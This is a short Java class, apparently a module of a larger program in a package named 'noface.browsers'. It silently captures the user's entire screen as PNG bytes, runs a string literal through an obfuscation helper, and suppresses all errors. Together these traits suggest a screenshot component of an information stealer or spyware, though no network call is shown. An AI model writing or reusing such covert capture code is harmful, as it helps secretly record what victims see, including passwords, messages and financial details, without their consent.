package noface.browsers;

import noface.config.S;

import javax.imageio.ImageIO;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

public final class Shot {

    public static byte[] png() {
        try {
            Rectangle area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            if (area.width < 1 || area.height < 1) return null;
            BufferedImage img = new Robot().createScreenCapture(area);
            ByteArrayOutputStream bos = new ByteArrayOutputStream(512 * 1024);
            if (!ImageIO.write(img, S.e("png"), bos)) return null;
            byte[] out = bos.toByteArray();
            return out.length > 0 ? out : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private Shot() {}
}
